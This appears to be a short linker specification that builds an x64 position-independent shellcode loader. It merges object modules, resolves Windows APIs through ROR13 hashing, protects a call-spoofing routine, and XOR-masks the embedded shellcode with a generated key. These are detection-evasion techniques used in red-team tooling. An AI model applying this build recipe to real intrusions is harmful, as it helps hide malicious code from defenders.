x64:
    load "bin/main.x64.o"
        make pic +gofirst +relax 
		protect "spoof_call"

	load "bin/services.x64.o"
    	merge

	load "bin/utils.x64.o"
	    merge

	load "bin/shellwriter.x64.o"
    	merge

	load "bin/spoof.x64.o"
    	merge

	fixbss "getBSS"


    dfr "resolve" "ror13" "KERNEL32, KERNELBASE, NTDLL"
    dfr "resolve_ext" "strings"

    mergelib "../tcg/libtcg/libtcg.x64.zip"

    generate $KEY 64

    push $KEY
        preplen
        link "mask"

    push $SC
        mask "xor" $KEY
        preplen
        link "sc"

    export